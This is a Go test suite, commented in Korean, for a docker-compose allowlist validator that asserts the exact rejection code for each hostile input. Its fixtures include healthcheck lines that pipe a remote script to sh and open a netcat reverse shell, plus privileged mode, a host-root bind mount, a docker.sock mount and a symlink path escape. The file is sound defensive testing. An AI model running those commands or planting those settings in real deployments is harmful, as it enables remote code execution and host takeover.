package compose

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// 이 파일의 규칙 하나: **거절은 코드까지 단언한다.** "거절됐다"만 보면 잘못된 이유로
// 거절되는 경로가 통과한다 — 예컨대 병합 키가 미지 키로 뭉개져 걸리면, 나중에 미지 키
// 판정만 느슨해져도 병합 키가 조용히 열린다. 어떤 방어선이 실제로 잡았는지를 못박는다.

// baseCompose는 allowlist를 온전히 통과하는 정본 형태다 — 악의 케이스는 여기서 한 곳만
// 비튼다(무엇이 판정을 뒤집었는지가 diff로 보이게).
const baseCompose = `services:
  app:
    image: ${DEPLOY_IMAGE_REF}
    ports:
      - "${DEPLOY_HOST_PORT}:8080"
    environment:
      - CORE_BLUE_URI
    restart: "unless-stopped"
    healthcheck:
      test: ["CMD-SHELL", "wget -qO- http://127.0.0.1:8080/actuator/health || exit 1"]
      interval: "10s"
      timeout: "3s"
      retries: 3
      start_period: "30s"
    extra_hosts:
      - "host.docker.internal:host-gateway"
`

// basePolicy는 정본 compose에 대응하는 호스트 배선이다.
func basePolicy() Policy {
	return Policy{
		AppService:  "app",
		ImageEnvVar: "DEPLOY_IMAGE_REF",
		EnvAllow:    []string{"CORE_BLUE_URI", "CORE_GREEN_URI"},
		// 볼륨 없는 정본이므로 등재 목록은 비어 있다(볼륨 테스트가 따로 채운다).
		EvalSymlinks: func(s string) (string, error) { return s, nil },
	}
}

func TestValidateAcceptsCanonical(t *testing.T) {
	spec, err := Validate([]byte(baseCompose), basePolicy())
	if err != nil {
		t.Fatalf("정본 compose가 거절됐다: %v", err)
	}
	if spec.Service != "app" {
		t.Fatalf("서비스명=%q, app 기대", spec.Service)
	}
	if !spec.NeedsHostPort {
		t.Fatal("ports가 선언됐는데 NeedsHostPort=false — 호스트 포트 주입이 누락된다")
	}
	if len(spec.EnvKeys) != 1 || spec.EnvKeys[0] != "CORE_BLUE_URI" {
		t.Fatalf("EnvKeys=%v, [CORE_BLUE_URI] 기대", spec.EnvKeys)
	}
}

// 악의 입력 표 — 설계 rev.2/2.1/2.2의 검증 표 전 항목을 코드까지 단언한다.
func TestValidateRejectsWithCode(t *testing.T) {
	cases := []struct {
		name string
		yaml string
		code string
	}{
		// --- strict YAML(R2) ---
		{"멀티 문서", baseCompose + "---\nservices: {}\n", CodeMultiDoc},
		{"앵커 정의", `services:
  app: &a
    image: ${DEPLOY_IMAGE_REF}
`, CodeAnchor},
		{"별칭 참조", `services:
  app:
    image: ${DEPLOY_IMAGE_REF}
    extra_hosts: *missing
`, CodeYAMLParse}, // 정의되지 않은 별칭은 파서가 먼저 거절한다
		{"앵커+별칭", `x: &base
  image: ${DEPLOY_IMAGE_REF}
services:
  app: *base
`, CodeAnchor},
		{"병합 키", `services:
  app:
    <<: {image: "x"}
    image: ${DEPLOY_IMAGE_REF}
`, CodeMergeKey},
		{"중복 키(서비스 필드)", `services:
  app:
    image: ${DEPLOY_IMAGE_REF}
    image: "evil/image:latest"
`, CodeDupKey},
		{"중복 키(최상위)", `services:
  app:
    image: ${DEPLOY_IMAGE_REF}
services:
  app:
    image: "evil"
`, CodeDupKey},
		{"비문자열 키(정수)", `services:
  1:
    image: ${DEPLOY_IMAGE_REF}
`, CodeNonStringKey},
		{"허용 밖 태그(!!float)", `services:
  app:
    image: ${DEPLOY_IMAGE_REF}
    healthcheck:
      test: ["CMD-SHELL", "wget -qO- http://127.0.0.1:8080/actuator/health || exit 1"]
      retries: !!float 3
`, CodeTag},
		{"허용 밖 태그(커스텀)", `services:
  app:
    image: !custom ${DEPLOY_IMAGE_REF}
`, CodeTag},
		{"null 태그", `services:
  app:
    image: ${DEPLOY_IMAGE_REF}
    restart: ~
`, CodeTag},
		{"YAML 아님", "\t\x00not yaml", CodeYAMLParse},

		// --- 최상위·서비스(G-02·R1) ---
		{"최상위 version", "version: \"3\"\n" + baseCompose, CodeTopLevel},
		{"최상위 volumes", baseCompose + "volumes:\n  d: {}\n", CodeTopLevel},
		{"최상위 x- 확장 키", baseCompose + "x-anything:\n  a: \"b\"\n", CodeTopLevel},
		{"서비스 2개", `services:
  app:
    image: ${DEPLOY_IMAGE_REF}
  sidecar:
    image: "busybox"
`, CodeServiceCount},
		{"서비스 0개", "services: {}\n", CodeServiceCount},
		{"서비스명 불일치(CP-3)", `services:
  notapp:
    image: ${DEPLOY_IMAGE_REF}
`, CodeServiceName},

		// --- 미지 키(닫힌 목록) ---
		{"privileged", `services:
  app:
    image: ${DEPLOY_IMAGE_REF}
    privileged: true
`, CodeUnknownKey},
		{"cap_add", `services:
  app:
    image: ${DEPLOY_IMAGE_REF}
    cap_add:
      - "SYS_ADMIN"
`, CodeUnknownKey},
		{"network_mode host", `services:
  app:
    image: ${DEPLOY_IMAGE_REF}
    network_mode: "host"
`, CodeUnknownKey},
		{"deploy(replica)", `services:
  app:
    image: ${DEPLOY_IMAGE_REF}
    deploy:
      replicas: 3
`, CodeUnknownKey},
		{"command(rev.2에서 제거)", `services:
  app:
    image: ${DEPLOY_IMAGE_REF}
    command: ["sh"]
`, CodeUnknownKey},
		{"유니코드 변형 키(정규화 금지)", `services:
  app:
    image: ${DEPLOY_IMAGE_REF}
    ｉmage: "evil"
`, CodeUnknownKey},

		// --- image(R3·CP-3) ---
		{"image 고정 참조", `services:
  app:
    image: "registry.example/core:latest"
`, CodeImage},
		// 기본값 문법·다른 변수는 **보간 차단**이 잡는다(image 정확일치보다 앞선 방어선) —
		// 등재 밖 보간 소스라는 것이 이 입력들의 본질이고, image 검사는 `$` 없는 위조를 맡는다.
		{"image 기본값 문법", `services:
  app:
    image: ${DEPLOY_IMAGE_REF:-latest}
`, CodeInterpolation},
		{"image 다른 변수", `services:
  app:
    image: ${OTHER_VAR}
`, CodeInterpolation},
		{"image 없음", `services:
  app:
    restart: "no"
`, CodeImage},

		// --- ports(R4) ---
		{"ports 고정 정수", `services:
  app:
    image: ${DEPLOY_IMAGE_REF}
    ports:
      - "18080:8080"
`, CodePorts},
		{"ports 2항목", `services:
  app:
    image: ${DEPLOY_IMAGE_REF}
    ports:
      - "${DEPLOY_HOST_PORT}:8080"
      - "${DEPLOY_HOST_PORT}:8080"
`, CodePorts},
		{"ports 호스트IP 바인딩", `services:
  app:
    image: ${DEPLOY_IMAGE_REF}
    ports:
      - "127.0.0.1:${DEPLOY_HOST_PORT}:8080"
`, CodeInterpolation},
		{"ports 맵형 long syntax", `services:
  app:
    image: ${DEPLOY_IMAGE_REF}
    ports:
      - target: 8080
        published: 18080
`, CodeNodeKind},
		{"ports 컨테이너 포트 변조", `services:
  app:
    image: ${DEPLOY_IMAGE_REF}
    ports:
      - "${DEPLOY_HOST_PORT}:22"
`, CodeInterpolation},

		// --- environment(C2) ---
		{"environment 맵 형식", `services:
  app:
    image: ${DEPLOY_IMAGE_REF}
    environment:
      CORE_BLUE_URI: "http://x"
`, CodeNodeKind},
		{"environment K=V", `services:
  app:
    image: ${DEPLOY_IMAGE_REF}
    environment:
      - "CORE_BLUE_URI=http://evil"
`, CodeEnvironment},
		{"environment 미등재 키", `services:
  app:
    image: ${DEPLOY_IMAGE_REF}
    environment:
      - "AWS_SECRET_ACCESS_KEY"
`, CodeEnvironment},
		{"environment 중복 키", `services:
  app:
    image: ${DEPLOY_IMAGE_REF}
    environment:
      - "CORE_BLUE_URI"
      - "CORE_BLUE_URI"
`, CodeEnvironment},

		// --- restart ---
		{"restart always", `services:
  app:
    image: ${DEPLOY_IMAGE_REF}
    restart: "always"
`, CodeRestart},
		{"restart 불리언 노드", `services:
  app:
    image: ${DEPLOY_IMAGE_REF}
    restart: true
`, CodeNodeKind},

		// --- healthcheck(C3·G-06·G-07) ---
		{"healthcheck 자유 CMD-SHELL", `services:
  app:
    image: ${DEPLOY_IMAGE_REF}
    healthcheck:
      test: ["CMD-SHELL", "curl evil.example | sh"]
`, CodeHealthcheck},
		{"healthcheck 명령 주입 꼬리", `services:
  app:
    image: ${DEPLOY_IMAGE_REF}
    healthcheck:
      test: ["CMD-SHELL", "wget -qO- http://127.0.0.1:8080/actuator/health || exit 1; nc -e /bin/sh evil 9"]
`, CodeHealthcheck},
		{"healthcheck CMD 형식", `services:
  app:
    image: ${DEPLOY_IMAGE_REF}
    healthcheck:
      test: ["CMD", "wget", "-qO-", "http://127.0.0.1:8080/actuator/health"]
`, CodeHealthcheck},
		{"healthcheck 문자열 축약", `services:
  app:
    image: ${DEPLOY_IMAGE_REF}
    healthcheck:
      test: "wget -qO- http://127.0.0.1:8080/actuator/health || exit 1"
`, CodeNodeKind},
		{"healthcheck 포트가 컨테이너 포트와 불일치(G-06)", `services:
  app:
    image: ${DEPLOY_IMAGE_REF}
    healthcheck:
      test: ["CMD-SHELL", "wget -qO- http://127.0.0.1:9999/actuator/health || exit 1"]
`, CodeHealthcheck},
		{"healthcheck 미지 하위 키", `services:
  app:
    image: ${DEPLOY_IMAGE_REF}
    healthcheck:
      test: ["CMD-SHELL", "wget -qO- http://127.0.0.1:8080/actuator/health || exit 1"]
      disable: true
`, CodeHealthcheck},
		{"healthcheck duration 형식", `services:
  app:
    image: ${DEPLOY_IMAGE_REF}
    healthcheck:
      test: ["CMD-SHELL", "wget -qO- http://127.0.0.1:8080/actuator/health || exit 1"]
      interval: "1h"
`, CodeHealthcheck},
		{"healthcheck duration 범위 초과(G-07)", `services:
  app:
    image: ${DEPLOY_IMAGE_REF}
    healthcheck:
      test: ["CMD-SHELL", "wget -qO- http://127.0.0.1:8080/actuator/health || exit 1"]
      interval: "301s"
`, CodeHealthcheck},
		{"healthcheck duration 0(G-07)", `services:
  app:
    image: ${DEPLOY_IMAGE_REF}
    healthcheck:
      test: ["CMD-SHELL", "wget -qO- http://127.0.0.1:8080/actuator/health || exit 1"]
      timeout: "0s"
`, CodeHealthcheck},
		{"healthcheck retries 비정수", `services:
  app:
    image: ${DEPLOY_IMAGE_REF}
    healthcheck:
      test: ["CMD-SHELL", "wget -qO- http://127.0.0.1:8080/actuator/health || exit 1"]
      retries: "3"
`, CodeNodeKind},

		// --- extra_hosts ---
		{"extra_hosts 임의 매핑", `services:
  app:
    image: ${DEPLOY_IMAGE_REF}
    extra_hosts:
      - "registry.example:10.0.0.9"
`, CodeExtraHosts},

		// --- 보간 차단(R3·G-04) ---
		{"$VAR 무중괄호", `services:
  app:
    image: ${DEPLOY_IMAGE_REF}
    restart: "$RESTART"
`, CodeInterpolation},
		{"$$ 이스케이프", `services:
  app:
    image: ${DEPLOY_IMAGE_REF}
    extra_hosts:
      - "$$host.docker.internal:host-gateway"
`, CodeInterpolation},
		{"등재 밖 변수(environment 값 자리)", `services:
  app:
    image: ${DEPLOY_IMAGE_REF}
    environment:
      - "${EVIL}"
`, CodeInterpolation},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			_, err := Validate([]byte(tc.yaml), basePolicy())
			if err == nil {
				t.Fatalf("거절되어야 하는데 통과했다")
			}
			if got := CodeOf(err); got != tc.code {
				t.Fatalf("거절 코드=%q, 기대 %q — 다른 방어선이 우연히 잡았다(그 방어선이 느슨해지면 조용히 열린다): %v", got, tc.code, err)
			}
		})
	}
}

// U-11(blind 핵심 방어선): YAML 이스케이프로 숨긴 `$`. 원문 바이트 스캔은 `\x24`를 놓치지만
// **디코드 후 스칼라**를 보면 compose가 실제로 볼 문자열이 그대로 드러난다.
func TestValidateRejectsEscapedDollar(t *testing.T) {
	escaped := []struct{ name, yaml string }{
		{"\\x24 이스케이프", `services:
  app:
    image: ${DEPLOY_IMAGE_REF}
    restart: "\x24{EVIL}"
`},
		{"\\u0024 이스케이프", `services:
  app:
    image: ${DEPLOY_IMAGE_REF}
    restart: "${EVIL}"
`},
		{"블록 스칼라", `services:
  app:
    image: ${DEPLOY_IMAGE_REF}
    restart: >-
      ${EVIL}
`},
	}
	for _, tc := range escaped {
		t.Run(tc.name, func(t *testing.T) {
			_, err := Validate([]byte(tc.yaml), basePolicy())
			if err == nil {
				t.Fatal("이스케이프된 $가 통과했다 — 보간 차단이 원문 스캔에 기대고 있다")
			}
			if got := CodeOf(err); got != CodeInterpolation {
				t.Fatalf("거절 코드=%q, %q 기대: %v", got, CodeInterpolation, err)
			}
		})
	}
	// 원문에 `$`가 있어도 **주석 안**이면 디코드 대상이 아니므로 통과한다(G-04 — 과잉 거절 방지).
	withComment := strings.Replace(baseCompose, "services:", "# 배포 정본 — ${NOTE} 는 주석이라 보간되지 않는다\nservices:", 1)
	if _, err := Validate([]byte(withComment), basePolicy()); err != nil {
		t.Fatalf("주석 안의 $가 거절됐다(디코드 대상이 아니다): %v", err)
	}
}

// U-16(blind 핵심 방어선): 맵형(long syntax) 볼륨으로 호스트 루트를 바인드하는 시도.
// 짧은 문자열 표기만 허용하므로 **타입 단계**에서 걸려야 한다 — 튜플 파싱까지 가면
// "3칸이 아니다" 같은 엉뚱한 이유로 걸리고, long syntax 지원이 붙는 순간 열린다.
func TestValidateRejectsLongSyntaxVolume(t *testing.T) {
	y := `services:
  app:
    image: ${DEPLOY_IMAGE_REF}
    volumes:
      - type: bind
        source: /
        target: /host
`
	_, err := Validate([]byte(y), basePolicy())
	if err == nil {
		t.Fatal("맵형 볼륨(호스트 루트 바인드)이 통과했다")
	}
	if got := CodeOf(err); got != CodeNodeKind {
		t.Fatalf("거절 코드=%q, %q 기대(타입 단계에서 걸려야 한다): %v", got, CodeNodeKind, err)
	}
}

// 볼륨 정확 튜플 대조 — 등재된 것만, Clean 후 비교, mode 필수.
func TestValidateVolumeTuples(t *testing.T) {
	root := t.TempDir()
	data := filepath.Join(root, "data")
	if err := os.MkdirAll(data, 0o755); err != nil {
		t.Fatal(err)
	}
	p := basePolicy()
	p.VolumeAllow = []VolumeRule{{Src: data, Dst: "/app/data", Mode: "rw"}}
	p.EvalSymlinks = filepath.EvalSymlinks

	compose := func(item string) []byte {
		return []byte(`services:
  app:
    image: ${DEPLOY_IMAGE_REF}
    volumes:
      - "` + item + `"
`)
	}

	if _, err := Validate(compose(data+":/app/data:rw"), p); err != nil {
		t.Fatalf("등재 튜플이 거절됐다: %v", err)
	}
	// G-05: Clean 후 같은 경로면 표기 차이는 통과한다(대조를 표기로 비껴갈 수 없다).
	if _, err := Validate(compose(filepath.Join(root, ".", "data")+":/app/data:rw"), p); err != nil {
		t.Fatalf("Clean 후 같은 경로가 거절됐다: %v", err)
	}

	bad := []struct{ name, item string }{
		{"미등재 호스트 경로", "/etc:/app/data:rw"},
		{"미등재 컨테이너 경로", data + ":/app/other:rw"},
		{"mode 승격", data + ":/app/data:ro"},
		{"mode 생략", data + ":/app/data"},
		{"named volume", "appdata:/app/data:rw"},
		{"상대 경로", "./data:/app/data:rw"},
		{"부모 참조", data + "/../data:/app/data:rw"},
		{"docker 소켓", "/var/run/docker.sock:/var/run/docker.sock:rw"},
	}
	for _, tc := range bad {
		t.Run(tc.name, func(t *testing.T) {
			_, err := Validate(compose(tc.item), p)
			if err == nil {
				t.Fatal("거절되어야 하는데 통과했다")
			}
			if got := CodeOf(err); got != CodeVolume {
				t.Fatalf("거절 코드=%q, %q 기대: %v", got, CodeVolume, err)
			}
		})
	}
}

// U-19(blind 핵심 방어선): 등재된 경로 자체가 심볼릭 링크로 다른 곳을 가리키는 탈출.
// 경로 문자열 대조만 하면 완벽히 통과하지만, 실제 마운트 대상은 링크가 가리키는 곳이다.
func TestValidateRejectsSymlinkEscape(t *testing.T) {
	root := t.TempDir()
	real := filepath.Join(root, "real")
	if err := os.MkdirAll(real, 0o755); err != nil {
		t.Fatal(err)
	}
	link := filepath.Join(root, "data")
	if err := os.Symlink(real, link); err != nil {
		t.Skipf("심볼릭 링크를 만들 수 없는 환경: %v", err)
	}
	p := basePolicy()
	// 등재 목록에는 링크 경로가 그대로 들어 있다 — 문자열 대조만으로는 통과한다.
	p.VolumeAllow = []VolumeRule{{Src: link, Dst: "/app/data", Mode: "rw"}}
	p.EvalSymlinks = filepath.EvalSymlinks

	y := []byte(`services:
  app:
    image: ${DEPLOY_IMAGE_REF}
    volumes:
      - "` + link + `:/app/data:rw"
`)
	_, err := Validate(y, p)
	if err == nil {
		t.Fatal("심볼릭 링크 경로가 통과했다 — 실제 마운트 대상이 선언과 다르다(경로 탈출)")
	}
	if got := CodeOf(err); got != CodeVolume {
		t.Fatalf("거절 코드=%q, %q 기대: %v", got, CodeVolume, err)
	}

	// 부재 경로도 통과가 아니다(증명 불가 = 실패).
	p.VolumeAllow = []VolumeRule{{Src: filepath.Join(root, "missing"), Dst: "/app/data", Mode: "rw"}}
	y = []byte(`services:
  app:
    image: ${DEPLOY_IMAGE_REF}
    volumes:
      - "` + filepath.Join(root, "missing") + `:/app/data:rw"
`)
	if _, err := Validate(y, p); CodeOf(err) != CodeVolume {
		t.Fatalf("부재 경로 거절 코드=%q, %q 기대: %v", CodeOf(err), CodeVolume, err)
	}
}

// 파서 방어(G-16·R2 F19) — 크기·깊이·노드 수 상한.
func TestValidateParserLimits(t *testing.T) {
	t.Run("크기 상한", func(t *testing.T) {
		big := baseCompose + "# " + strings.Repeat("x", MaxComposeBytes) + "\n"
		if got := CodeOf(mustErr(t, []byte(big))); got != CodeSize {
			t.Fatalf("코드=%q, %q 기대", got, CodeSize)
		}
	})
	t.Run("빈 입력", func(t *testing.T) {
		if got := CodeOf(mustErr(t, nil)); got != CodeSize {
			t.Fatalf("코드=%q, %q 기대", got, CodeSize)
		}
	})
	t.Run("깊이 상한", func(t *testing.T) {
		var b strings.Builder
		b.WriteString("services:\n")
		indent := "  "
		for i := 0; i < 20; i++ {
			b.WriteString(strings.Repeat(indent, i+1) + "k" + string(rune('a'+i)) + ":\n")
		}
		b.WriteString(strings.Repeat(indent, 21) + "v: \"x\"\n")
		if got := CodeOf(mustErr(t, []byte(b.String()))); got != CodeDepth {
			t.Fatalf("코드=%q, %q 기대", got, CodeDepth)
		}
	})
	t.Run("노드 수 상한", func(t *testing.T) {
		var b strings.Builder
		b.WriteString("services:\n  app:\n    environment:\n")
		for i := 0; i < maxNodes; i++ {
			b.WriteString("      - \"K\"\n")
		}
		if got := CodeOf(mustErr(t, []byte(b.String()))); got != CodeNodeLimit {
			t.Fatalf("코드=%q, %q 기대", got, CodeNodeLimit)
		}
	})
}

func mustErr(t *testing.T, y []byte) error {
	t.Helper()
	_, err := Validate(y, basePolicy())
	if err == nil {
		t.Fatal("거절되어야 하는데 통과했다")
	}
	return err
}

// Validate는 **부작용 0**이다 — 파일을 하나도 만들지 않는다. "없던 파일이 없다"를 단언하면
// fail-open 골든이므로(원래도 없었다) 디렉터리 전체 스냅샷을 전/후로 비교한다.
func TestValidateHasNoSideEffects(t *testing.T) {
	dir := t.TempDir()
	before := snapshot(t, dir)
	p := basePolicy()
	p.VolumeAllow = []VolumeRule{{Src: dir, Dst: "/app/data", Mode: "rw"}}
	p.EvalSymlinks = filepath.EvalSymlinks
	for _, y := range []string{baseCompose, "services: {}", "not: yaml: at: all"} {
		_, _ = Validate([]byte(y), p)
	}
	if after := snapshot(t, dir); after != before {
		t.Fatalf("검증이 파일시스템을 바꿨다(부작용 0 위반):\n전=%s\n후=%s", before, after)
	}
}

// snapshot은 디렉터리 트리를 (경로·크기·모드) 문자열로 접는다 — 생성·삭제·변경 전부 드러난다.
func snapshot(t *testing.T, dir string) string {
	t.Helper()
	var out []string
	err := filepath.Walk(dir, func(p string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}
		rel, rerr := filepath.Rel(dir, p)
		if rerr != nil {
			return rerr
		}
		out = append(out, rel+"|"+info.Mode().String()+"|"+itoa(info.Size()))
		return nil
	})
	if err != nil {
		t.Fatalf("스냅샷 실패: %v", err)
	}
	return strings.Join(out, "\n")
}

func itoa(n int64) string {
	if n == 0 {
		return "0"
	}
	var b []byte
	for n > 0 {
		b = append([]byte{byte('0' + n%10)}, b...)
		n /= 10
	}
	return string(b)
}

// U-35: 디코드 후 크기 상한의 **경계**. 상한 자체(64KiB)는 통과하고 1바이트 초과가 거절돼야
// 한다 — 부등호가 한 칸 어긋나면 정상 compose가 거절되거나(운영 사고) 상한이 사실상 없어진다.
func TestValidateSizeCapBoundary(t *testing.T) {
	// baseCompose 뒤에 주석을 붙여 정확히 MaxComposeBytes / +1 바이트를 만든다.
	pad := func(total int) []byte {
		head := baseCompose + "# "
		if len(head)+1 > total {
			t.Fatalf("픽스처가 목표 크기보다 크다: %d > %d", len(head)+1, total)
		}
		return []byte(head + strings.Repeat("x", total-len(head)-1) + "\n")
	}

	exact := pad(MaxComposeBytes)
	if len(exact) != MaxComposeBytes {
		t.Fatalf("경계 픽스처 크기=%d, %d 기대", len(exact), MaxComposeBytes)
	}
	if _, err := Validate(exact, basePolicy()); err != nil {
		t.Fatalf("상한 정확히 %d바이트가 거절됐다(경계 오프바이원): %v", MaxComposeBytes, err)
	}

	over := pad(MaxComposeBytes + 1)
	if len(over) != MaxComposeBytes+1 {
		t.Fatalf("초과 픽스처 크기=%d", len(over))
	}
	if got := CodeOf(mustErr(t, over)); got != CodeSize {
		t.Fatalf("상한 +1바이트 거절 코드=%q, %q 기대", got, CodeSize)
	}
}
